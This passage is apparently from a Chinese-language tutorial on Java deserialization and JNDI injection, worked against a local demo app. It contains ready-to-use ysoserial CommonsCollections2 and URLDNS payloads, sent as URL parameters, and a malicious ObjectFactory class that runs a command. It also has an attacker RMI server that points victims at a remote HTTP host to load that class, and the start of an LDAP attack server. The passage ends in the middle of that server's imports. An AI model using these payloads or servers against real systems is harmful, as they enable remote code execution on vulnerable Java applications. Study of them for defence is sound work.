http://localhost:8080/demo_war_exploded/deser?str=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa%2FORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F3QAHmFhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3QAAHEAfgAFdAAEaHR0cHB4dAAlaHR0cDovL2FhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3g%3D
```

<img width="978" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/59753cd6-5164-4093-8d5f-5afd416be353">

**2、利用⽤cc2 commons-collections4执行命令**
 Maven 项目中用于添加依赖，增加pom文件内容
```
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
```

<img width="792" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/49a82ba0-4ce1-4eb1-8614-ffde50a013f5">

配置命令

```java
java -jar ysoserial-main-49888d3191-1.jar  CommonsCollections2 "open -a Calculator" | base64
```

payload
```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAE+cr+ur4AAAAzAEoKABEAIwcAJAgAJQoAJgAnCgACACgIACkKAAIAKggAEggAKwgALAgALQkAEAAuCgAvADAKAC8AMQcAMgcAQQcANAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlOwEACDxjbGluaXQ+AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwAdBwAyAQAKU291cmNlRmlsZQEAFENvbW1hbmRUZW1wbGF0ZS5qYXZhDAAUABUBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcANQwANgA3DAA4ADkBAAN3aW4MADoAOwEAAi9jAQAEYmFzaAEAAi1jDAASABMHADwMAD0APgwAPwBAAQATamF2YS9pby9JT0V4Y2VwdGlvbgEALHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBADt5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NgEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NjsHAEEJAEMALgEAEm9wZW4gLWEgQ2FsY3VsYXRvcggARQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAEcKAEgAIwAhABAASAAAAAEACAASABMAAAACAAEAFAAVAAEAFgAAAC8AAQABAAAABSq3AEmxAAAAAgAXAAAABgABAAAABQAYAAAADAABAAAABQAZAEIAAAAIABsAFQABABYAAACyAAMAAgAAAEQSRrMARAa9AAJLEgO4AAS2AAUSBrYAB5kAECoDEghTKgQSCVOnAA0qAxIKUyoEEgtTKgWyAAxTuAANKrYADlenAARMsQABAAoAPwBCAA8AAwAXAAAALgALAAUACgAKAA0AGgAOAB8ADwAnABEALAASADEAFAA3ABYAPwAZAEIAFwBDABoAGAAAAAwAAQAKADkAHAAdAAAAHgAAAA4ABPwAJwcAHwlQBwAgAAABACEAAAACACJ1cQB+ABgAAAHUyv66vgAAADMAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAxwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQACEVHSFZJSlRNcHcBAHhzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXg=
```
payload进行url编码后，访问
```
http://localhost:8080/demo_war_exploded/deser?str=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci%2F5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB%2BAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj%2Fa3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAE%2Bcr%2Bur4AAAAzAEoKABEAIwcAJAgAJQoAJgAnCgACACgIACkKAAIAKggAEggAKwgALAgALQkAEAAuCgAvADAKAC8AMQcAMgcAQQcANAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlOwEACDxjbGluaXQ%2BAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwAdBwAyAQAKU291cmNlRmlsZQEAFENvbW1hbmRUZW1wbGF0ZS5qYXZhDAAUABUBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcANQwANgA3DAA4ADkBAAN3aW4MADoAOwEAAi9jAQAEYmFzaAEAAi1jDAASABMHADwMAD0APgwAPwBAAQATamF2YS9pby9JT0V4Y2VwdGlvbgEALHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBADt5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NgEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NjsHAEEJAEMALgEAEm9wZW4gLWEgQ2FsY3VsYXRvcggARQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAEcKAEgAIwAhABAASAAAAAEACAASABMAAAACAAEAFAAVAAEAFgAAAC8AAQABAAAABSq3AEmxAAAAAgAXAAAABgABAAAABQAYAAAADAABAAAABQAZAEIAAAAIABsAFQABABYAAACyAAMAAgAAAEQSRrMARAa9AAJLEgO4AAS2AAUSBrYAB5kAECoDEghTKgQSCVOnAA0qAxIKUyoEEgtTKgWyAAxTuAANKrYADlenAARMsQABAAoAPwBCAA8AAwAXAAAALgALAAUACgAKAA0AGgAOAB8ADwAnABEALAASADEAFAA3ABYAPwAZAEIAFwBDABoAGAAAAAwAAQAKADkAHAAdAAAAHgAAAA4ABPwAJwcAHwlQBwAgAAABACEAAAACACJ1cQB%2BABgAAAHUyv66vgAAADMAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAxwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQACEVHSFZJSlRNcHcBAHhzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXg%3D
```
### （二）、URLDMNS链

简介urldns链

```
URLDNS链是java原生态的一条利用链，通常用于存在反序列化漏洞进行验证的，因为是原生态，不存在什么版本限制。

HashMap结合URL触发DNS检查的思路。

在实际过程中可以首先通过这个去判断服务器是否使用了readObject()以及能否执行。

之后再用各种gadget去尝试试RCE。
```

1、hashmap与url类的分析

Hashmap类readObject方法的跟进,新建一个文件，写一个Hashmap，跟进去

```java
package com.example.demo;

import java.util.HashMap;

public class dns_hashmap {
    public static void main(String[] args) {
        HashMap
    }
}
```

<img width="702" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/72f99bd4-edf7-4a8b-98e2-477db01415f8">

跟进hashmap

<img width="784" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/8364f198-2b4f-456c-bb43-41e8bbe31580">

找到Hashmap的readObject方法，该方法会在Hashmap类反序列化的时候自动调用

<img width="720" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/bccf2d41-6646-4031-8b3e-4aad8d4b3189">

继续向下，有一个hash(key)方法，先不管这个“key”，跟进去看看hash方法的内容，

<img width="746" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b651cf98-c4e9-47c4-908d-9ebe494a329b">

- 用 `putVal` 方法将键值对放入 `HashMap` 中。
- `hash(key)` 方法计算键 `key` 的哈希值，确定它在 `HashMap` 中的存储位置。
- `putVal` 方法将键值对放入哈希表中的对应位置，如果需要，会进行扩容并处理哈希冲突。

<img width="641" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/da2e0567-7d91-43ba-9ab6-8ca18b3ee160">

它是 `HashMap` 或 `Hashtable` 等哈希表数据结构中用于确定键的存储位置的方法之一

```
从这个参数定义，可以知道这个key是一个对象，

当key不为空的情况下，就会调用key这个对象的hashcode方法，
总结：Hashmap.readObject	--	HashMap.hash	--	传入对象得.hashCode
```

2、URL类hashcode方法的跟进

继续新建一个url类，跟进去，也有一个hashcode方法，看下内容

```
package com.example.demo;

//import java.util.HashMap;
import java.net.URL;
public class dns_hashmap {
    public static void main(String[] args) {
        URL
    }
}
```

跟进url，查看hashcode方法

<img width="568" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/32288c6e-cc71-4c7b-a737-f6438963de39">

当hashcode不等于 -1 的时候，直接返回hashcode的值，结束本函数，
跟一下hashcode变量，发现其默认值为“-1”

<img width="447" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/3291d3e2-99fe-449e-b9b8-0cb9db756dff">

也就是，默认情况下会继续向下执行，不会直接返回hashcode的值，
继续看下855行的代码“hashCode(this)”，这个“this”是一个url，而359行的getHostAddress函数要去解析这个url
跟进

<img width="640" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/9c34a3c2-a7ff-42ab-abbf-7871f9438d3a">

 InetAddress类的getByName方法的作用是，传入host解析IP，返回ip。

<img width="608" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/be551ea4-4b80-4d9d-ad88-d9ca8cdb9e6b">

```
小结下，

URL.hashcode	--	URLStreamHandler.hashCode	-->	

-->  URLStreamHandler.getHostAddress	--	InetAddress.getByName

```

3、InetAddress类的getByName方法

创建一个InetAddress类的getByName方法

```java
package com.example.demo;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class main {

    public static void main(String[] args) throws Exception {
        try{
            InetAddress address =InetAddress.getByName("baidu.com");
            System.out.println(address.getHostAddress());
        }catch(UnknownHostException e){
            e.printStackTrace();
        }
    }
}
```

<img width="1070" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/060e6669-aa01-48a1-928a-b5cb6386fd4c">

```
小结
传入域名会解析其对应的IP，我们可以在dns的解析记录找到，
但是假设传入是IP，则没有地方可以找到受害者的解析记录
```
整个链路的分析

```
由上面总结就可以知道，Hashmap类在反序列化的时候，会调用传入对象的hashcode方法。

而url类的hashcode方法会解析dns对应的IP；

所以整个链接就是，
Hashmap.readObject	--	HashMap.hash	-->
	
--> URL.hashcode（传入对象）  -->	URLStreamHandler.hashCode	-->

--> URLStreamHandler.getHostAddress	--	InetAddress.getByName

```

由上面的结果推导出，最常见的触发demo代码，

```java
    package com.example.demo;

    import java.net.MalformedURLException;
    import java.net.URL;
    import java.util.HashMap;

    public class dns_hashmap {
        public static void main(String[] args) throws MalformedURLException {
            HashMap<URL,Integer> hashmap = new HashMap<>();
          //创建了一个HashMap，其中键的类型是URL，值的类型是Integer
            URL url = new URL("http://dd.l3eqkh.dnslog.cn/aa");
            System.out.println(url);
            System.out.println(url.getClass());
            hashmap.put(url,2);
          //将URL放入HashMap
        }
    }


```

###  （三）、JDNI注入以及rmi和Ldap的利用

**1、Jndi、Ldap、Rmi协议**

1.1、什么是ladp协议

LDAP（Lightweight Directory Access Protocol）是一种用于访问和维护分布式目录信息的协议。

1.2、jndi协议

通过JNDI协议来操作（增删改查）LDAP服务中的数据

```java
jndi可以理解为java程序提供的一个统一的api接口，

通过jndi我们不仅可以操作ldap服务中的数据，还可以联动操作其他的服务协议，

比如：JDBC、LDAP、RMI、DNS、NIS、CORBA

在这些协议中，安全从业者用的比较多的就是 LADP、RMI、DNS 
```

```
但在 Java 中，JNDI 提供了便利的接口让我们更容易的使用 LDAP 和 DNS；

但是LDAP、RMI和DNS都是可以不依赖JNDI而独立工作的
```

1.3、rmi协议

```
RMI（Remote Method Invocation）是Java语言中用于实现远程过程调用的机制。

它允许在不同Java虚拟机（JVM）上运行的程序之间通过网络通信来进行方法调用和数据传输，

实现分布式计算和远程服务调用。


个人的理解就是我写好一些方法，放到网络服务上，大家不必关系这些方法具体是如何实现的，

直接通过rmi协议加载调用即可，和一些web的api的功能类似。

需要注意的是，RMI是Java特有的远程调用机制，它只适用于Java之间的通信。

在现代的分布式系统中，

更常见的做法是使用Web服务（如RESTful API和SOAP）或消息队列（如RabbitMQ和Apache Kafka）等跨平台、跨语言的远程调用方式。

另外需要注意的就是，定义远程接口和实现都有一定的格式和要求

```

举例

定义远程接口：

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteCalculator extends Remote {
    int add(int a, int b) throws RemoteException;
    int subtract(int a, int b) throws RemoteException;
}
//这两个方法定义了远程接口RemoteCalculator的方法签名。它们分别表示远程计算器可以执行的加法和减法操作
```

实现远程接口：

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class CalculatorImpl extends UnicastRemoteObject implements RemoteCalculator {

    public CalculatorImpl() throws RemoteException {
        // 构造函数需要抛出RemoteException
    }

    public int add(int a, int b) throws RemoteException {
        return a + b;
    }

    public int subtract(int a, int b) throws RemoteException {
        return a - b;
    }
}


```

服务器端：

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            // 创建远程对象
            RemoteCalculator calculator = new CalculatorImpl();
            // 启动RMI Registry，监听默认端口1099
            Registry registry = LocateRegistry.createRegistry(1099);
            // 将远程对象绑定到RMI Registry上，客户端将通过该名称来查找远程对象
            registry.rebind("Calculator", calculator);
            System.out.println("服务器已启动...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

客户端：

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient {
    public static void main(String[] args) {
        try {
            // 连接到RMI Registry
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);

            // 在RMI Registry中查找远程对象
            RemoteCalculator calculator = (RemoteCalculator) registry.lookup("Calculator");

            // 调用远程方法
            int resultAdd = calculator.add(10, 5);
            int resultSubtract = calculator.subtract(10, 5);

            System.out.println("10 + 5 = " + resultAdd);
            System.out.println("10 - 5 = " + resultSubtract);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```
在这个例子中，我们创建了一个简单的RMI服务器和客户端。
	
服务器端创建了CalculatorImpl对象，并将其绑定到RMI Registry上。

客户端通过RMI Registry查找到Calculator对象，并调用其中的远程方法进行计算。

这样，客户端就可以在远程调用的帮助下执行服务器端的方法，并获得计算结果。

```

**2、jndi注入**

```
JNDI 注⼊，即当开发者在定义 JNDI 接⼝初始化时，lookup() ⽅法的参数可控，

攻击者就可以将恶意的url 传⼊参数远程加载恶意载荷，造成注⼊攻击。
```

其中使用ladp协议多，rmi协议用的少是因为高版本默认不能直接使用rmi协议
```
package com.example.demo;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class jndi {
    public static void main(String[] args) throws NamingException {
        String uri = "rmi://127.0.0.1:1099/Exploit"; //包含了一个RMI（远程方法调用）服务的地址     
        InitialContext initialContext = new InitialContext();   
      //它允许在命名服务中执行查询操作。这个对象将被用来查找和访问命名服务
        initialContext.lookup(uri);   //查找指定URI对应的对象                        
    }
}
```

<img width="748" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/de61d06f-029e-40a7-8dc7-adcaa0f6e631">

rmi协议的利用


先说下rmi协议的利用，需要注意的是
当前的jdk版本是 jdk112，jdk113以后 不存在此漏洞 ⼤多数⽤ldap协议攻击
更换idea的执行jdk版本,先加载几个jdk的版本到idea，然后修改项目执行的jdk版本，

idea--文件---项目结构---SDK----选择一个jdk8

<img width="1024" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/299b0cdc-cf6d-4a75-baca-c030241dba06">

生成恶意class文件payload
注意，这个exp，不要放在这种“com.example.demo”包内，

<img width="1261" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/bccb47d5-29b9-4575-a575-21999c3fb745">

```java
package com.test.test;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class jndiexp implements ObjectFactory {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

```java
这段代码是Java的JNDI（Java Naming and Directory Interface）服务的API的一部分。

1. `public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception`：
这是一个公开的方法，它名叫`getObjectInstance`，返回一个类型为Object的对象，这是所有Java对象类型的基类。 

2. 函数的参数： 
- `obj`是一个对象实例，它将作为转换或查找的目标。
- `name`则是一个JNDI名字实例，它表示需要查找的对象的名字。
- `nameCtx`是一个命名的上下文，它提供了查找对象所需要的环境。
- `environment`则是一个哈希表，它装载了一组环境属性，用以影响查找操作。

3. 方法的功能：
这个函数的主要功能是从JNDI命名服务中获取一个对象，旨在查找在JNDI注册的对象。例如，可能是在EJB或者在Web应用开发中查找注册在JNDI树结构中的对象。

4. 方法返回的结果： 
方法返回一个Object类型的对象。如果找不到对象，此方法返回null。

5. `throws Exception`：
这个表示方法在执行过程中可能会抛出异常，方法调用时需要处理这个异常。

6. 这段代码只是一个函数的框架，它并没有实际的实现。在实际使用中，需要根据实际的需求来实现这个函数。

注意：ObjectFactory接口的getObjectInstance方法，是抽象方法，子类需要覆盖此方法，以提供自定义的对象工厂实现。
```

右击选择“重新构建”，选择“构建模块”的话，仅仅会在第一次生成class文件，

假设删除这个class文件，在“构建模块”就不会重新生成class文件，“重新构建”就ok

生成的class文件在这个target文件夹内可以找到

然后将这个生成的class文件放到kali机器上，开启http服务等待受害者机器来请求

```
黑客准备的恶意rmi服务，java文件   RMI_Hack_Server.java

将上面生成的class文件放到了另一个kali机器上，这个Reference函数的第一个参数任意写，

第二个参数就是上面class文件的名称（不用加.class）；第三个参数是class文件的http地址
```

```java
package com.example.demo2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMI_Hack_Server {
    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true ");
        //监听RMI服务端⼝
        Registry registry = LocateRegistry.createRegistry(7778);
         创建⼀个远程的JNDI对象⼯⼚类的引⽤对象      第一个参数任意写
        Reference reference = new Reference("jndiexp", "jndiexp", "http://192.168.1.27:8081/");
        // 转换为RMI引⽤对象,
        // 因为Reference没有实现Remote接⼝也没有继承UnicastRemoteObject类，故不能作为远程对象bind到注册中⼼，
        // 所以需要使⽤ReferenceWrapper对Reference的实例进⾏⼀个封装。
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        //绑定⼀个恶意的Remote对象到RMI服务
        registry.bind("exp", wrapper);
    }
}


```

受害者的业务代码. Rmi_Target_Server.java

```java
package com.example.demo;
import javax.naming.InitialContext;
import javax.naming.NamingException;


public class Rmi_Target_Server  {
    public static void main(String[] args) throws NamingException, NamingException {
        String uri = "rmi://127.0.0.1:7778/exp";
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        //初始化上下⽂
        InitialContext initialContext = new InitialContext();
        // 获取RMI绑定的恶意ReferenceWrapper对象
        initialContext.lookup(uri);
    }
}


```

总结

```
rmi客户端（目标服务器）需要请求一个rmi服务器（hacker搭建的），

只能拿到一个要执行函数名称yy和这个函数的地址xx

然后rmi客户端在请求http://xx/yy拿到最终的恶意代码，然后执行


rmi服务器就不能返回“最终的恶意代码”，这个和整个rmi服务架构设计的流程有关

rmi服务器的作用就是返回“要执行的函数名称”和这个函数在哪里


而对于 LDAP 协议，攻击者同样可以在恶意服务器上创建恶意的 LDAP 资源，

例如恶意的 LDAP 对象或恶意的 LDAP URL。当客户端执行 JNDI 查询时，

会连接到恶意的 LDAP 服务器，并获取恶意资源。


在这两种协议中，恶意的服务器充当了 "资源指向" 的角色，

将客户端的查询请求指向恶意资源。客户端不知情地获取到了恶意的资源，

并在后续操作中可能触发恶意代码的执行。

```

**ladp协议利用**

先配置环境pom.xml

```xml
        <dependency>
            <groupId>com.unboundid</groupId>
            <artifactId>unboundid-ldapsdk</artifactId>
            <version>6.0.8</version>
        </dependency>

```

修改pom文件之后，重新构造项目本地还会在生成jndiexp.class文件,而本地有这个文件，服务器就不会去远程读取，记得删除这个生成的文件.

ldap_Hack_server.java

```java
package com.example.demo;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
